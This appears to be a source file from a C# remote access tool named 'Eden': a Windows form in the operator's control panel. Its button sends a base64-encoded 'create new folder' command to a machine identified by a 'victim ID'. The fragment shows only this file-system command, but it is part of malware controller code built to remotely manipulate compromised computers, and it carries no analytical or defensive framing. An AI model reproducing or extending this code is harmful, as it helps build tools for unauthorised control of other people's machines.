using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileAddDir : Form
    {
        public Client m_clnt;
        public string szVictimID;

        public frmFileAddDir()
        {
            InitializeComponent();
        }

        void setup()
        {
            textBox1.Text = "NewFolder_" + clsTools.GetFileNameFromDatetime();
        }

        private void frmFileAddDir_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            m_clnt.SendVictim(szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
        }
    }
}
